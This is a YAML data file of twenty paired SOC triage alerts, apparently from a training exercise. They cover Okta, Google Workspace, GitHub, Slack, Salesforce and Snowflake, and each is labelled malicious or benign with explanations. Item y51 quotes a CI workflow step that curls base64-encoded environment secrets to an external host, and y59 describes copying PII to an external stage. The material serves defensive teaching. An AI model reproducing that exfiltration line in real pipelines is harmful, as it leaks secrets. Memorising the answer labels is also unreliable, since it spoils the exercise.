@@ -1,0 +1,271 @@
+# ON SHIFT alerts, drop 2, part 3: SaaS (Okta, Google Workspace, GitHub, Slack, Salesforce, Snowflake) pairs (y41-y60)
+- id: y41
+  d: identity
+  src: 'Okta · System Log'
+  t: 'API token created'
+  h: 'admin: j.ferro@corp.com'
+  l: ['eventType: system.api_token.create · token name "sync-helper" · inherits Super Admin', 'actor: j.ferro (help desk role elevated to Super Admin 22 min earlier via a support case)', 'client: new device, IP 185.x.x.x (residential proxy), user agent Chrome on Linux', 'no integration references this token name']
+  v: 1
+  x: T1098.001
+  c: okta-api-token
+  k: [1, 2]
+  diff: 3
+  say: 'An Okta API token with super admin rights was created by a help desk user, elevated 22 minutes earlier, from a residential proxy.'
+  tell: 'Okta API tokens inherit the creating admin''s privileges and survive password resets and MFA. A fresh Super Admin elevation 22 minutes earlier plus a token minted from a residential proxy is the persistence play after takeover. Revoke the token, not just the session.'
+- id: y42
+  d: identity
+  src: 'Okta · System Log'
+  t: 'API token created'
+  h: 'admin: svc-iac-okta'
+  l: ['eventType: system.api_token.create · token name "terraform-okta-prod"', 'actor: svc-iac-okta (dedicated automation admin, custom role limited to app and group management)', 'client: corp CI egress IP, user agent HashiCorp Terraform provider', 'token name matches the secret rotated in the vault in pipeline run 6718']
+  v: 0
+  x: T1098.001
+  c: okta-api-token
+  k: [1, 3]
+  diff: 3
+  trap: scary
+  say: 'An Okta API token was created by the infrastructure automation admin with a limited role, from the CI egress address, matching a pipeline secret rotation.'
+  tell: 'Token creation is expected from automation. The tells here are the identity (a dedicated service admin with a custom, limited role), the source (CI egress, Terraform provider user agent) and a matching secret rotation in the same pipeline run. A super admin minting an unnamed helper token is the other thing.'
+- id: y43
+  d: identity
+  src: 'Okta · System Log'
+  t: 'Sign-on policy rule updated'
+  h: 'policy: Global Session Policy'
+  l: ['eventType: policy.rule.update · rule "Require MFA, all apps" changed to "MFA: not required" for group Everyone', 'actor: admin.contractor@corp.com (created 3 days ago, Org Admin)', 'change made from IP 45.x.x.x, new geo; no matching change in the IAM repo', 'followed by 14 password-only sign-ins to the finance app within 20 min']
+  v: 1
+  x: T1556.009
+  c: okta-policy-change
+  k: [0, 3]
+  diff: 3
+  say: 'A contractor admin created three days ago switched the MFA requirement off for everyone, from a new location, and password-only finance sign-ins followed.'
+  tell: 'Switching MFA off at the policy is the strongest move in the identity playbook: no prompt left to defeat. Brand-new admin, new geo, no matching change in the IAM repo, and password-only sign-ins to finance within minutes.'
+- id: y44
+  d: identity
+  src: 'Okta · System Log'
+  t: 'Sign-on policy rule updated'
+  h: 'policy: Global Session Policy'
+  l: ['eventType: policy.rule.update · rule "Allow MFA: push or TOTP" changed to "Phishing-resistant only (FIDO2, Okta FastPass)" for group Everyone', 'actor: iam-admin@corp.com (IAM team, 4 years)', 'change made from the corporate VPN; merged in the IAM repo, applied by the Terraform pipeline', 'direction: stronger; exception group "FIDO2-rollout" holds 31 users for 14 days']
+  v: 0
+  x: T1556.009
+  c: okta-policy-change
+  k: [0, 3]
+  diff: 3
+  trap: scary
+  say: 'The IAM team tightened the sign-on policy to FIDO2 methods only, applied from the pipeline, with a temporary exception group for users still enrolling.'
+  tell: 'Policy edits cut both ways. This one raises the bar to phishing-resistant factors, comes from the IAM team over the VPN through the repo and pipeline, and keeps a time-boxed exception group. Direction, actor and source all point the same way.'
+- id: y45
+  d: cloud
+  src: 'Google Workspace · Admin audit log'
+  t: 'Domain-wide delegation granted'
+  h: 'client: 1029384756-mailsync.apps.googleusercontent.com'
+  l: ['event: AUTHORIZE_API_CLIENT_ACCESS · scopes: https://mail.google.com/ and full Drive', 'actor: super admin eli.sandoval@corp.com from 91.x.x.x (new country)', 'client ID is not in the Marketplace or the approved app list; created in a Cloud project owned by a personal Gmail account', 'first API calls from the client: users.messages.list for 11 executives within 4 min']
+  v: 1
+  x: T1098.003
+  c: gws-domain-delegation
+  k: [1, 2]
+  diff: 3
+  say: 'Domain-wide delegation with full mail and Drive scopes was granted to an unlisted client from a new country, then it read executive mailboxes.'
+  tell: 'Domain-wide delegation lets a service account impersonate every user in the domain, so full mail scopes granted to an unlisted client are a skeleton key. The client lives in a personal Cloud project, the grant came from a new country, and four minutes later it was listing messages for executives.'
+- id: y46
+  d: cloud
+  src: 'Google Workspace · Admin audit log'
+  t: 'Domain-wide delegation granted'
+  h: 'client: 5566778899-vendor-backup.apps.googleusercontent.com'
+  l: ['event: AUTHORIZE_API_CLIENT_ACCESS · scopes: gmail.readonly and drive.readonly', 'actor: super admin ops-admin@corp.com from the corporate VPN', 'client belongs to the approved backup vendor (Marketplace listing, verified publisher, on the approved app list)', 'first API calls: backup job from the vendor published IP ranges, read-only, all users on schedule']
+  v: 0
+  x: T1098.003
+  c: gws-domain-delegation
+  k: [2, 3]
+  diff: 3
+  trap: scary
+  say: 'Read-only delegation went to the approved backup vendor client from the VPN, and its first calls were a scheduled backup from vendor ranges.'
+  tell: 'Same admin event, opposite grant. The client is a verified Marketplace publisher on the approved list, the scopes are read-only, the grant came over the VPN, and the first traffic is a scheduled backup from the vendor''s published ranges.'
+- id: y47
+  d: cloud
+  src: 'Google Workspace · Drive audit log'
+  t: 'Bulk link-sharing change'
+  h: 'user: priya.shah@corp.com'
+  l: ['event: change_user_access to "anyone with the link" on 214 files in 6 min', 'folders: Finance/Payroll-2026, HR/Offers, Legal/M&A', 'client: Chrome on Windows, new device, IP 103.x.x.x, sign-in 12 min earlier without an MFA step (session cookie)', 'followed by an export of all 214 link URLs through a Sheets formula']
+  v: 1
+  x: T1567
+  c: gws-bulk-link-share
+  k: [0, 2]
+  diff: 3
+  say: 'Over two hundred finance, HR and legal files were switched to anyone-with-the-link in six minutes, from a new device on a cookie session.'
+  tell: 'Opening 214 sensitive files to the link in six minutes is bulk exposure, and exporting the URLs to a sheet is the harvest. New device, a session with no MFA step (a stolen cookie), sensitive folders. Revoke the session first, then unshare.'
+- id: y48
+  d: cloud
+  src: 'Google Workspace · Drive audit log'
+  t: 'Bulk link-sharing change'
+  h: 'user: dkim@corp.com'
+  l: ['event: change_user_access to "anyone with the link" on 61 files in 3 min', 'folder: Marketing/Press-Kit-Q3 (owner team marketing, classification label Public)', 'client: Chrome on a managed Mac, corp IP, sign-in with MFA this morning', 'DLP scan: 0 sensitive-info matches on the 61 files']
+  v: 0
+  x: T1567
+  c: gws-bulk-link-share
+  k: [1, 3]
+  diff: 2
+  trap: scary
+  say: 'Sixty-one files in a marketing press kit folder labelled public were shared by link from a managed Mac, and DLP found nothing sensitive.'
+  tell: 'Link sharing at volume is also what marketing does when it publishes a press kit. The folder carries a Public classification, the device is managed, sign-in had MFA and DLP finds no sensitive matches. Classification and content decide it, not the count.'
+- id: y49
+  d: cloud
+  src: 'GitHub · Audit log'
+  t: 'Mass repository clone'
+  h: 'actor: ltorres (PAT)'
+  l: ['action: git.clone · 143 private repositories in 9 min via a personal access token (classic, repo scope)', 'source: 45.x.x.x (VPS provider, never seen for ltorres)', 'token created 2 days ago, 11 min after a sign-in from a new device; ltorres normally touches 4 repos a week', 'includes infra-secrets, payments-core, internal-tools']
+  v: 1
+  x: T1213.003
+  c: github-mass-clone
+  k: [0, 2]
+  diff: 3
+  say: 'A personal access token cloned 143 private repositories in nine minutes from a VPS address; the token is two days old.'
+  tell: 'ltorres touches four repos a week. A classic PAT with repo scope cloned 143 in nine minutes from a VPS the account has never used, including infra-secrets. The token was minted right after a new-device sign-in. Revoke the PAT and rotate everything in those repos.'
+- id: y50
+  d: cloud
+  src: 'GitHub · Audit log'
+  t: 'Mass repository clone'
+  h: 'actor: sourcegraph-indexer (GitHub App)'
+  l: ['action: git.clone · 138 private repositories in 7 min via a GitHub App installation token', 'source: 52.x.x.x (the vendor documented egress range, matches the app IP allow list)', 'app installed by the org owner 14 months ago, permissions: contents read, metadata read', 'same crawl at 03:00 UTC every night since install']
+  v: 0
+  x: T1213.003
+  c: github-mass-clone
+  k: [1, 3]
+  diff: 3
+  trap: scary
+  say: 'A GitHub App installation token cloned 138 repositories from the vendor allow-listed range with read-only permissions, as it has every night.'
+  tell: 'Mass cloning is what code search indexers do every night. A GitHub App with read-only permissions, installed by the org owner over a year ago, from the vendor''s documented range, on the same 03:00 UTC schedule. Compare a fresh PAT from a VPS touching infra repos.'
+- id: y51
+  d: cloud
+  src: 'GitHub · Audit log'
+  t: 'Workflow file changed'
+  h: 'repo: corp/payments-core'
+  l: ['action: git.push to branch tmp-fix-ci by contractor-dev (outside collaborator, 4 days)', 'diff to .github/workflows/ci.yml: new step curl -s -d "$(env | base64)" https://hooks-collector[.]site/x', 'workflow trigger is pull_request_target, so secrets are available to code from the branch', 'no CODEOWNERS review; the run started 40 s after the push']
+  v: 1
+  x: T1552.001
+  c: gha-workflow-change
+  k: [1, 2]
+  diff: 3
+  say: 'An outside collaborator pushed a workflow change posting the environment to an external URL, on a secrets-exposing trigger, without code owner review.'
+  tell: 'env piped to curl in a CI step is a secrets exfiltration line, and pull_request_target hands secrets to code from a branch or fork. Outside collaborator four days old, no CODEOWNERS review, run 40 seconds after the push. Rotate every secret that workflow could read.'
+- id: y52
+  d: cloud
+  src: 'GitHub · Audit log'
+  t: 'Workflow file changed'
+  h: 'repo: corp/payments-core'
+  l: ['action: git.push to main by platform-bot (merged PR 2210 from the platform team)', 'diff to .github/workflows/deploy.yml: adds aws-actions/configure-aws-credentials with role-to-assume (OIDC) and removes the long-lived AWS_SECRET_ACCESS_KEY secret', 'trigger: push to main only; permissions: id-token write, contents read', 'CODEOWNERS review by security-engineering on the PR']
+  v: 0
+  x: T1552.001
+  c: gha-workflow-change
+  k: [1, 2]
+  diff: 3
+  trap: scary
+  say: 'A merged platform team pull request swapped a long-lived cloud key for OIDC role assumption, on a main-only trigger with security review.'
+  tell: 'Workflow edits that touch secrets are not all bad: this one removes a long-lived key and adopts OIDC, from the platform team through a merged, security-reviewed PR, on a push-to-main trigger with minimal permissions. Author, trigger and egress all point toward hardening.'
+- id: y53
+  d: cloud
+  src: 'GitHub · Audit log'
+  t: 'Deploy key added'
+  h: 'repo: corp/infra-prod'
+  l: ['action: repo.add_deploy_key · title "build-cache" · read_only: false', 'actor: asharma (org member) from 103.x.x.x, new geo, session started with a recovery code', 'no pull request, issue or infra change references this key', 'fingerprint is in no host inventory; key added 8 min after an admin password reset email']
+  v: 1
+  x: T1098.001
+  c: github-deploy-key
+  k: [0, 1, 3]
+  diff: 3
+  say: 'A write-enabled deploy key was added to the production infrastructure repo from a new country on a recovery-code session.'
+  tell: 'A deploy key with write access is a password-free way back into infra-prod that survives the user''s own password reset. New geo, recovery-code session, a key fingerprint no host owns, and no change record. Remove the key and review pushes since.'
+- id: y54
+  d: cloud
+  src: 'GitHub · Audit log'
+  t: 'Deploy key added'
+  h: 'repo: corp/infra-prod'
+  l: ['action: repo.add_deploy_key · title "argocd-infra-prod" · read_only: true', 'actor: platform-bot via GitHub App, corp automation egress', 'PR 2255 "Add Argo CD read access for infra-prod" merged, reviewed by two platform engineers', 'fingerprint matches the key in the Argo CD cluster secret in the platform repo']
+  v: 0
+  x: T1098.001
+  c: github-deploy-key
+  k: [0, 3]
+  diff: 3
+  trap: scary
+  say: 'A read-only deploy key for the GitOps controller was added by platform automation via a reviewed PR; the fingerprint matches the cluster secret.'
+  tell: 'Deploy keys are how GitOps controllers pull config. This one is read-only, added by platform automation, tied to a merged PR with two reviewers, and its fingerprint matches the secret in the cluster. The attacker version is write-enabled, from a new geo, with nothing behind it.'
+- id: y55
+  d: cloud
+  src: 'Slack · Audit Logs'
+  t: 'Workspace export started'
+  h: 'actor: v.romero@corp.com (Workspace Owner)'
+  l: ['action: export_started · scope: all public and private channels and DMs, 24 months', 'actor session: new device, IP 91.x.x.x, sign-in through an unrecognized SSO app token', 'no legal hold, discovery case or corporate export policy referenced', 'export download requested 3 min after start from a different IP (104.x.x.x)']
+  v: 1
+  x: T1213
+  c: slack-export
+  k: [0, 2, 3]
+  diff: 3
+  say: 'A workspace owner started a full channel and DM export from a new device; the download came from a different address.'
+  tell: 'A full export including private channels and DMs is the biggest single data grab in Slack. New device, an SSO session from an unrecognised app token, no hold or discovery case behind it, and the file fetched from a different IP than the one that asked for it. Treat the owner as compromised.'
+- id: y56
+  d: cloud
+  src: 'Slack · Audit Logs'
+  t: 'Workspace export started'
+  h: 'actor: legal-ops@corp.com (eDiscovery admin)'
+  l: ['action: export_started · scope: channels and DMs of 3 named custodians, 18 months', 'actor session: corporate VPN, managed device, sign-in with MFA', 'matter LIT-2026-041 is under legal hold; the export policy is logged in the Legal case tracker', 'download requested by the same session from the same IP 4 min later']
+  v: 0
+  x: T1213
+  c: slack-export
+  k: [0, 2]
+  diff: 3
+  trap: scary
+  say: 'Legal operations exported messages of three named custodians under an active legal hold from a managed device on the VPN.'
+  tell: 'Same action, opposite scope. Three named custodians, 18 months, an eDiscovery admin on a managed device over the VPN, a matter under legal hold, and the download fetched by the same session from the same IP. Scope and process separate discovery from theft.'
+- id: y57
+  d: cloud
+  src: 'Salesforce · Event Monitoring'
+  t: 'Large report export'
+  h: 'user: integration.svc@corp.com'
+  l: ['event: ReportExport · report "All Contacts + Opportunities" · 412,000 rows · CSV', 'user: integration.svc (API-only profile) now logging in interactively from 185.x.x.x in a browser session', 'login: password only; the connected-app OAuth flow this user normally uses was bypassed', 'same user queried the Bulk API for Account, Contact and Opportunity within the hour']
+  v: 1
+  x: T1213
+  c: sfdc-bulk-export
+  k: [1, 2]
+  diff: 3
+  say: 'An API-only integration user logged in interactively from a new address with a password and exported 412,000 contact and opportunity rows.'
+  tell: 'An integration user should only ever authenticate through its connected app. An interactive browser login from a new IP, password only, followed by a 412,000-row CSV export and Bulk API queries, means the credentials left the integration. Freeze the user and review the export.'
+- id: y58
+  d: cloud
+  src: 'Salesforce · Event Monitoring'
+  t: 'Large report export'
+  h: 'user: bi-sync@corp.com'
+  l: ['event: ReportExport · report "Pipeline snapshot" · 388,000 rows · CSV', 'user: bi-sync (integration profile), login through connected app "Snowflake-Sync" with OAuth JWT', 'source: vendor documented egress range, matches the login IP range on the profile', 'runs daily at 02:00, same row count within 1% for 90 days']
+  v: 0
+  x: T1213
+  c: sfdc-bulk-export
+  k: [1, 3]
+  diff: 3
+  trap: scary
+  say: 'A BI sync integration exported about 388,000 rows through its connected app from the allowed IP range on its usual 02:00 schedule.'
+  tell: 'Almost the same row count as the attack case, which is why the count cannot decide it. This user authenticates through its connected app with OAuth JWT, from the vendor''s range, on a daily schedule with a stable row count for 90 days.'
+- id: y59
+  d: cloud
+  src: 'Snowflake · LOGIN_HISTORY and QUERY_HISTORY'
+  t: 'Service user bulk SELECT'
+  h: 'user: svc_reporting'
+  l: ['login: password auth, no MFA (service user without a network policy), IP 45.x.x.x (VPS), client JDBC from a Linux host', 'queries: SELECT * on CUSTOMER_PII, ORDERS, PAYMENTS · 38 GB result over 41 min', 'COPY INTO an external stage s3://tmp-export[.]xyz/ through an unknown storage integration', 'svc_reporting normally runs 12 queries a day from the BI subnet 10.30.0.0/24']
+  v: 1
+  x: T1078.004
+  c: snowflake-service-bulk
+  k: [0, 2]
+  diff: 3
+  say: 'A reporting service user logged in with a password from a VPS address and copied customer and payment tables out to an unknown external stage.'
+  tell: 'A service user with a password and no network policy is a credential-stuffing target, and this one logged in from a VPS instead of the BI subnet, pulled 38 GB of PII and copied it to an external stage nobody owns. Add the network policy, move to key-pair auth and rotate.'
+- id: y60
+  d: cloud
+  src: 'Snowflake · LOGIN_HISTORY and QUERY_HISTORY'
+  t: 'Service user bulk SELECT'
+  h: 'user: svc_dbt'
+  l: ['login: key-pair auth (RSA JWT) from the BI subnet 10.30.0.0/24, client dbt-snowflake 1.8', 'queries: SELECT from analytics.marts models, 7 GB result, scheduled run 02:00', 'COPY INTO an internal stage only; no external stages created', 'network policy bi-only enforced on the user; 14 queries a day, same pattern for 120 days']
+  v: 0
+  x: T1078.004
+  c: snowflake-service-bulk
+  k: [0, 3]
+  diff: 3
+  trap: scary
+  say: 'A dbt service user logged in with key-pair authentication from the BI subnet and ran its scheduled model queries, writing only to an internal stage.'
+  tell: 'Seven GB read by a service user is volume without a story: key-pair auth, the BI subnet, a network policy that enforces it, internal stage only, and 120 days of the same pattern. The theft variant uses a password from a VPS and an external stage.'
